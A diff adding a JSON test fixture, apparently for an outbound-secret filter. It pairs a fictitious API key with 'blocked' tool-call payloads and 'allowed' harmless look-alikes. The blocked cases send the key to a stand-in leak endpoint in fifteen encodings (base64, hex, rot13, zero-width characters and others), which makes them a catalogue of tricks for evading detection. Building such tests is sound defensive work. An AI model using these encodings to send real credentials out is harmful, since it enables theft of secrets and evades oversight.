@@ -1,0 +1,181 @@
+{
+  "secret": "sk-prod-99887766554433221100",
+  "endpoint": "https://example.invalid/leak",
+  "note": "全部为虚构值。blocked 期望拦截；allowed 期望放行。不包含跨字段拆分，见 cross_field_cases.json。",
+  "blocked": [
+    {
+      "id": "raw",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "sk-prod-99887766554433221100"
+      }
+    },
+    {
+      "id": "base64",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "c2stcHJvZC05OTg4Nzc2NjU1NDQzMzIyMTEwMA=="
+      }
+    },
+    {
+      "id": "urlsafe_base64",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "c2stcHJvZC05OTg4Nzc2NjU1NDQzMzIyMTEwMA=="
+      }
+    },
+    {
+      "id": "hex",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "736b2d70726f642d3939383837373636353534343333323231313030"
+      }
+    },
+    {
+      "id": "percent",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "%73%6B%2D%70%72%6F%64%2D%39%39%38%38%37%37%36%36%35%35%34%34%33%33%32%32%31%31%30%30"
+      }
+    },
+    {
+      "id": "double_base64",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "YzJzdGNISnZaQzA1T1RnNE56YzJOalUxTkRRek16SXlNVEV3TUE9PQ=="
+      }
+    },
+    {
+      "id": "zlib_base64",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "eJwrztYtKMpP0bW0tLAwNzczMzU1MTE2NjIyNDQwAAB0yAcI"
+      }
+    },
+    {
+      "id": "rot13",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "fx-cebq-99887766554433221100"
+      }
+    },
+    {
+      "id": "charcodes",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "[115, 107, 45, 112, 114, 111, 100, 45, 57, 57, 56, 56, 55, 55, 54, 54, 53, 53, 52, 52, 51, 51, 50, 50, 49, 49, 48, 48]"
+      }
+    },
+    {
+      "id": "reversed",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "00112233445566778899-dorp-ks"
+      }
+    },
+    {
+      "id": "newline_inserted",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "s\nk\n-\np\nr\no\nd\n-\n9\n9\n8\n8\n7\n7\n6\n6\n5\n5\n4\n4\n3\n3\n2\n2\n1\n1\n0\n0"
+      }
+    },
+    {
+      "id": "space_inserted",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "s k - p r o d - 9 9 8 8 7 7 6 6 5 5 4 4 3 3 2 2 1 1 0 0"
+      }
+    },
+    {
+      "id": "fullwidth",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "ｓｋ-ｐｒｏｄ-９９８８７７６６５５４４３３２２１１００"
+      }
+    },
+    {
+      "id": "zero_width",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "s​k​-​p​r​o​d​-​9​9​8​8​7​7​6​6​5​5​4​4​3​3​2​2​1​1​0​0"
+      }
+    },
+    {
+      "id": "wrapped_json_base64",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "eyJwYXlsb2FkIjogInNrLXByb2QtOTk4ODc3NjY1NTQ0MzMyMjExMDAifQ=="
+      }
+    }
+  ],
+  "allowed": [
+    {
+      "id": "status_text",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "uptime 99.98%, avg latency 42ms"
+      }
+    },
+    {
+      "id": "security_terms",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "audit passed: api_key template placeholder and curl probe verified"
+      }
+    },
+    {
+      "id": "summary_json",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "{\"order_count\":3,\"total_amount\":66}"
+      }
+    },
+    {
+      "id": "glossary_chinese",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "产品文档中的普通术语；帮助中心中的普通栏目名称"
+      }
+    },
+    {
+      "id": "sk_prefix_only",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "we evaluated scikit-learn; the sk- prefix is common"
+      }
+    },
+    {
+      "id": "redaction_markers",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "[redacted] and <masked> and [filtered]"
+      }
+    },
+    {
+      "id": "base64_noise",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "aGVsbG8gd29ybGQsIG5vdGhpbmcgc2VjcmV0IGhlcmU="
+      }
+    },
+    {
+      "id": "empty_payload",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": ""
+      }
+    },
+    {
+      "id": "unrelated_long_text",
+      "url": "https://example.invalid/leak",
+      "arguments": {
+        "payload": "The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. The quarterly report covers orders, shipping weights and normal glossary terms. "
+      }
+    }
+  ],
+  "pattern_recognized": [
+    "raw"
+  ],
+  "pattern_recognized_note": "raw 的明文形态本身匹配凭证模式，即使未跟踪到凭证也会被拒；其余用例只依赖已知凭证的编码表示识别，未跟踪凭证时应放行。"
+}
